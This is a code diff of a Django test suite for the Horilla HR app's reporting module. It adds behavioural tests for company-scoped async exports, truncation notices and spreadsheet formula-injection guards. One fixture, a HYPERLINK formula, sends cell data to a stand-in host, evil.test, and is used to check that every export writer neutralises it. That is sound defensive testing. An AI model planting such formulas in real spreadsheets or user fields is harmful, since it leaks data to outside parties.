@@ -503,8 +503,9 @@ class SubscriptionClaimTests(TestCase):
 
         # A successful send is required for the claim to stick: a failed
         # delivery deliberately releases it so the next poll retries.
-        with self._mail_configured(), patch(
-            "report.delivery.EmailMessage.send", return_value=1
+        with (
+            self._mail_configured(),
+            patch("report.delivery.EmailMessage.send", return_value=1),
         ):
             result_a = deliver_subscription(first)
             result_b = deliver_subscription(second)
@@ -523,8 +524,9 @@ class SubscriptionClaimTests(TestCase):
         from report.models import ReportSubscription
 
         sub = self._subscription()
-        with self._mail_configured(), patch(
-            "report.delivery.run_report", side_effect=RuntimeError("boom")
+        with (
+            self._mail_configured(),
+            patch("report.delivery.run_report", side_effect=RuntimeError("boom")),
         ):
             result = deliver_subscription(ReportSubscription.objects.get(pk=sub.pk))
         self.assertFalse(result.ok)
@@ -573,23 +575,89 @@ class AsyncExportScopingTests(TestCase):
             for _ in acquired:
                 async_export._export_slots.release()
 
-    def test_queue_accepts_company_id(self):
-        """The signature has to carry company_id: without it the worker has
-        no session and no ContextVar, so the workbook spans every company."""
-        import inspect
+    def test_the_worker_runs_inside_the_selected_company(self):
+        """The worker thread has no session and no ContextVar, so the company it
+        is handed has to be restored before any query runs. Without that the
+        emailed workbook spans every company while its letterhead names one."""
+        from types import SimpleNamespace
+        from unittest.mock import patch
 
-        from report.async_export import queue_export_email
+        from horilla.horilla_middlewares import get_selected_company
+        from report import async_export
 
-        params = inspect.signature(queue_export_email).parameters
-        self.assertIn("company_id", params)
+        company = make_company("Async Scope Co")
+        self.addCleanup(clear_selected_company)
+        clear_selected_company()
+        seen = {}
+
+        class _InlineThread:
+            """Run the worker on the calling thread so the test can observe it."""
+
+            def __init__(self, target, **_kwargs):
+                self._target = target
+
+            def start(self):
+                self._target()
+
+        def fake_run_report(slug, filters):
+            seen["selected"] = get_selected_company()
+            seen["filters_company"] = getattr(filters, "company_id", None)
+            return {"slug": slug, "title": "t", "kpis": [], "period": {}}
+
+        no_mail_server = SimpleNamespace(dynamic_from_email_with_display_name="")
+        with (
+            patch.object(async_export.threading, "Thread", _InlineThread),
+            patch("report.registry.run_report", fake_run_report),
+            patch(
+                "report.export.export_xlsx",
+                return_value=SimpleNamespace(content=b"x"),
+            ),
+            patch("base.backends.ConfiguredEmailBackend", return_value=no_mail_server),
+        ):
+            async_export.queue_export_email(
+                user_id=1,
+                to_email="x@test.horilla",
+                slug="workforce-composition",
+                fmt="xlsx",
+                filters_dict={},
+                meta={},
+                company_id=company.id,
+            )
+
+        self.assertEqual(seen.get("selected"), company.id)
+        self.assertEqual(seen.get("filters_company"), company.id)
 
     def test_view_passes_selected_company_to_the_worker(self):
-        import inspect
+        from unittest.mock import patch
 
-        from report.views import standard_reports
+        from django.test import RequestFactory
 
-        source = inspect.getsource(standard_reports.standard_report_export)
-        self.assertIn("company_id=company_id", source)
+        from report.views.standard_reports import standard_report_export
+
+        company = make_company("Export Pass Co")
+        user = make_user("export_pass_admin", is_superuser=True)
+        make_employee(
+            company=company, email="export_pass_admin@test.horilla", user=user
+        )
+
+        def export_request(selected):
+            request = RequestFactory().get(
+                "/report/standard/workforce-composition/export/",
+                {"async": "1", "format": "xlsx"},
+            )
+            request.user = user
+            request.session = {"selected_company": selected}
+            return request
+
+        for selected, expected in ((str(company.id), company.id), ("all", None)):
+            with self.subTest(selected=selected):
+                with patch("report.async_export.queue_export_email") as queue:
+                    response = standard_report_export(
+                        export_request(selected), "workforce-composition"
+                    )
+                self.assertEqual(response.status_code, 200, response.content)
+                queue.assert_called_once()
+                self.assertEqual(queue.call_args.kwargs["company_id"], expected)
 
 
 class PivotTruncationDisclosureTests(TestCase):
@@ -651,36 +719,6 @@ class SharedFormulaGuardTests(TestCase):
         self.assertIs(safe_cell(True), True)
         self.assertEqual(safe_cell(None), "")
 
-    def test_report_export_uses_the_shared_guard(self):
-        from horilla.export_safety import neutralize_formula
-        from report.export import _neutralize_formula
-
-        self.assertEqual(_neutralize_formula("=cmd"), neutralize_formula("=cmd"))
-
-    def test_other_writers_guard_their_cells(self):
-        """All four spreadsheet writers, not just report/export.py."""
-        import inspect
-
-        from base import methods as base_methods
-        from horilla_views import cbv_methods as hv_cbv
-        from horilla_views import views as hv_views
-
-        self.assertIn("safe_cell", inspect.getsource(base_methods.export_data))
-        self.assertIn("safe_cell", inspect.getsource(hv_views))
-        self.assertIn("safe_cell", inspect.getsource(hv_cbv))
-
-    def test_no_unguarded_worksheet_writes_remain(self):
-        """A regression fence: a new ws.append(row) without the guard is the
-        easiest way to reintroduce the sink."""
-        import inspect
-
-        from horilla_views import cbv_methods as hv_cbv
-
-        source = inspect.getsource(hv_cbv)
-        # Header rows are literals built in-module, not user data; the two
-        # data-row writes must both be wrapped.
-        self.assertNotIn("ws.append(row)", source)
-
     def test_client_side_export_guard_mirrors_python(self):
         """The explorer builds xlsx in the browser from the DOM, bypassing
         every server-side guard."""
@@ -711,6 +749,121 @@ class SharedFormulaGuardTests(TestCase):
                 markup,
                 f"{name} pivot export writes cells unguarded",
             )
+
+
+class SpreadsheetWritersNeutralizeFormulasTests(TestCase):
+    """
+    Each spreadsheet writer, driven with a formula payload in user-entered
+    data. The shared guard is only worth anything if every writer actually
+    passes its cells through it, so each is exercised end to end rather than
+    inspected for the helper's name.
+    """
+
+    PAYLOAD = '=HYPERLINK("http://evil.test/?d="&A1,"x")'
+
+    @classmethod
+    def setUpTestData(cls):
+        cls.company = make_company("Sink Co")
+        cls.admin = make_user("sink_admin", password="secret123", is_superuser=True)
+        make_employee(
+            company=cls.company, email="sink_admin@test.horilla", user=cls.admin
+        )
+        cls.victim = make_employee(
+            company=cls.company,
+            email="sink_victim@test.horilla",
+            first_name=cls.PAYLOAD,
+            last_name="Victim",
+        )
+
+    def setUp(self):
+        clear_selected_company()
+
+    def _client(self):
+        from django.test import Client
+
+        client = Client()
+        client.force_login(self.admin)
+        session = client.session
+        session["selected_company"] = "all"
+        session.save()
+        return client
+
+    def _cells(self, workbook):
+        return [
+            cell.value
+            for sheet in workbook.worksheets
+            for row in sheet.iter_rows()
+            for cell in row
+            if isinstance(cell.value, str)
+        ]
+
+    def _assert_neutralized(self, cells):
+        carrying = [c for c in cells if "HYPERLINK" in c]
+        self.assertTrue(carrying, "the payload never reached the workbook")
+        for value in carrying:
+            self.assertTrue(
+                value.startswith("'"), f"cell would execute when opened: {value!r}"
+            )
+
+    def _load(self, response):
+        import io
+
+        import openpyxl
+
+        self.assertEqual(response.status_code, 200)
+        return openpyxl.load_workbook(io.BytesIO(response.content))
+
+    def test_quick_export_builder_guards_its_cells(self):
+        from horilla_views.cbv_methods import export_xlsx
+
+        response = export_xlsx(
+            [{"name": self.PAYLOAD}], [("name", "Name")], file_name="sink"
+        )
+        self._assert_neutralized(self._cells(self._load(response)))
+
+    def test_import_template_builder_guards_its_cells(self):
+        from employee.models import Employee
+        from horilla_views.cbv_methods import generate_import_excel
+
+        workbook = generate_import_excel(
+            Employee,
+            ["employee_first_name"],
+            queryset=Employee.objects.filter(pk=self.victim.pk),
+        )
+        self._assert_neutralized(self._cells(workbook))
+
+    def test_list_view_quick_export_guards_its_cells(self):
+        import json
+
+        from django.urls import reverse
+
+        client = self._client()
+        response = client.post(
+            reverse("export-list", kwargs={"short_id": "sink"})
+            + "?model=employee.Employee",
+            {
+                "ids": json.dumps([self.victim.pk]),
+                "columns": json.dumps([["First name", "employee_first_name"]]),
+                "format": "xlsx",
+            },
+        )
+        self._assert_neutralized(self._cells(self._load(response)))
+
+    def test_model_export_guards_its_cells(self):
+        import json
+
+        from django.urls import reverse
+
+        from attendance.models import Attendance
+        from horilla.testkit.factories import make_attendance
+
+        make_attendance(employee=self.victim, attendance_date=date.today())
+        client = self._client()
+        response = client.get(
+            reverse("attendance-info-export"),
+            {"ids": json.dumps(list(Attendance.objects.values_list("id", flat=True)))},
+        )
+        self._assert_neutralized(self._cells(self._load(response)))
 
 
 class PeriodNoteDisclosureTests(TestCase):
@@ -850,50 +1003,107 @@ class AuditActivityScopingTests(TestCase):
 class MetricTruncationDisclosureTests(TestCase):
     """A KPI counting every match above a capped row list has to say so."""
 
+    # document_expiry_aging lists at most 200 rows but counts every match.
+    MATCHES = 205
+    LISTED = 200
+    OVERDUE = 105
+
+    @classmethod
+    def setUpTestData(cls):
+        import report.metrics  # noqa: F401
+
+        if not apps.is_installed("horilla_documents"):
+            return
+        from horilla_documents.models import Document
+
+        cls.today = date.today()
+        company = make_company("Truncation Co")
+        employee = make_employee(company=company, email="trunc@test.horilla")
+        Document.objects.bulk_create(
+            [
+                Document(
+                    title=f"Passport {i:03d}",
+                    employee_id=employee,
+                    expiry_date=cls.today
+                    + timedelta(days=-10 if i < cls.OVERDUE else 10),
+                )
+                for i in range(cls.MATCHES)
+            ]
+        )
+
+    def setUp(self):
+        if not apps.is_installed("horilla_documents"):
+            self.skipTest("horilla_documents is not installed")
+        clear_selected_company()
+
+    def _payload(self):
+        from report.engine import ReportFilters, resolve_period_preset
+        from report.registry import run_report
+
+        from_date, to_date = resolve_period_preset("all_time", self.today)
+        return run_report(
+            "document-expiry-aging",
+            ReportFilters(
+                from_date=from_date, to_date=to_date, period_preset="all_time"
+            ),
+        )
+
     def test_table_carries_truncation_flags(self):
-        import inspect
-
-        from report.metrics import compliance, packs
-
-        # The registered report is packs.document_expiry_aging;
-        # compliance.document_expiry serves the retired slug.
-        for fn in (packs.document_expiry_aging, compliance.document_expiry):
-            source = inspect.getsource(fn)
-            self.assertIn('"truncated"', source, fn.__name__)
-            self.assertIn('"total_rows"', source, fn.__name__)
+        table = self._payload()["table"]
+        self.assertEqual(len(table["rows"]), self.LISTED)
+        self.assertIs(table["truncated"], True)
+        self.assertEqual(table["total_rows"], self.MATCHES)
 
     def test_aging_buckets_count_every_match_not_just_listed_rows(self):
         """The buckets were built inside the row slice, so past the cap the
         KPI totals were wrong, not just the table."""
-        import inspect
+        payload = self._payload()
+        kpis = {str(k["label"]): k["value"] for k in payload["kpis"]}
+        self.assertEqual(kpis["Items tracked"], self.MATCHES)
+        self.assertEqual(kpis["Overdue"], self.OVERDUE)
+        self.assertEqual(sum(payload["charts"][0]["series"][0]["data"]), self.MATCHES)
 
-        from report.metrics import packs
+    def test_excel_data_sheet_reports_a_sample_not_a_total(self):
+        import io
 
-        source = inspect.getsource(packs.document_expiry_aging)
-        # Bucketing runs over a values_list of the full queryset, separate
-        # from the capped select_related loop that builds rows.
-        self.assertIn('values_list("expiry_date"', source)
-        self.assertIn("[:ROW_CAP]", source)
+        import openpyxl
 
-    def test_exports_and_ui_honour_the_flag(self):
-        import inspect
+        from report.export import export_xlsx
+
+        workbook = openpyxl.load_workbook(
+            io.BytesIO(export_xlsx(self._payload(), "x.xlsx", meta={}).content)
+        )
+        text = " ".join(
+            str(cell.value)
+            for row in workbook["Data"].iter_rows()
+            for cell in row
+            if cell.value is not None
+        )
+        self.assertIn(f"Rows: {self.LISTED} of {self.MATCHES} (sample)", text)
+
+    def test_pdf_reports_the_real_total_not_the_listed_rows(self):
+        from unittest.mock import patch
+
+        from django.template.loader import render_to_string
+
+        from report.export import export_pdf
+
+        with patch(
+            "django.template.loader.render_to_string", wraps=render_to_string
+        ) as render:
+            export_pdf(self._payload(), "x.pdf", meta={})
+        context = render.call_args.args[1]
+        self.assertIs(context["truncated"], True)
+        self.assertEqual(context["total_rows"], self.MATCHES)
+        self.assertEqual(context["shown_rows"], self.LISTED)
+
+    def test_the_page_flags_a_truncated_table(self):
+        """The one half that stays a source check: the notice is drawn by
+        client-side JS in this template, which no Python test can execute."""
         from pathlib import Path
 
         from django.conf import settings
 
-        from report import export
-
-        # PDF path escalates its own cap with the metric's flag.
-        self.assertIn(
-            'table_meta.get("truncated")',
-            (
-                inspect.getsource(export._render_pdf_context)
-                if hasattr(export, "_render_pdf_context")
-                else inspect.getsource(export)
-            ),
-        )
-        # Excel data sheet reports a sample rather than a total.
-        self.assertIn("(sample)", inspect.getsource(export._write_data_sheet))
         markup = (
             Path(settings.BASE_DIR)
             / "horilla_theme"
@@ -1004,14 +1214,18 @@ class CohortActiveFilterTests(TestCase):
         self.assertIn("Early", names, f"leaver missing from drill-down: {result}")
 
     def test_quality_of_hire_cohort_includes_leavers(self):
-        import inspect
+        """The denominator must not be active-filtered, or retention trends
+        toward 100% no matter how many new hires leave."""
+        from report.registry import run_report
 
-        from report.metrics import talent
-
-        # The denominator must not be active-filtered, or retention trends
-        # toward 100% no matter how many new hires leave.
-        source = inspect.getsource(talent.quality_of_hire)
-        self.assertIn("apply_employment_status=False", source)
+        payload = run_report("quality-of-hire", self._filters())
+        outcomes = {str(r["name"]): str(r["outcome"]) for r in payload["table"]["rows"]}
+        leaver = next((o for n, o in outcomes.items() if n.startswith("Early")), None)
+        self.assertEqual(
+            leaver, "Early exit", f"the leaver is missing from the cohort: {outcomes}"
+        )
+        kpis = {str(k["label"]): k["value"] for k in payload["kpis"]}
+        self.assertEqual(kpis["90-day retention"], "50.0%", kpis)
 
 
 class TemplateShadowingTests(TestCase):
@@ -1072,24 +1286,13 @@ class PdfFontEmbeddingTests(TestCase):
     def test_pdf_embeds_a_truetype_font(self):
         from report.export import export_pdf
 
-        body = export_pdf(self._payload(), filename="f.pdf", meta={}).content
+        response = export_pdf(self._payload(), filename="f.pdf", meta={})
+        self.assertEqual(response["Content-Type"], "application/pdf")
+        body = response.content
         self.assertEqual(body[:4], b"%PDF")
         # An embedded TrueType face appears as a FontFile2 stream. With the
         # base-14 fallback there is none, which is exactly the broken state.
         self.assertIn(b"FontFile2", body)
-
-    def test_link_callback_resolves_the_bundled_font(self):
-        import os
-
-        from django.conf import settings
-
-        from report.export import PDF_FONT_STATIC_PATH, _pdf_link_callback
-
-        uri = f"{settings.STATIC_URL}{PDF_FONT_STATIC_PATH}"
-        resolved = _pdf_link_callback(uri, "")
-        self.assertTrue(
-            os.path.isfile(resolved), f"font URI did not resolve: {resolved}"
-        )
 
     def test_link_callback_passes_through_what_it_cannot_resolve(self):
         """An unresolvable asset must not fail the whole document."""
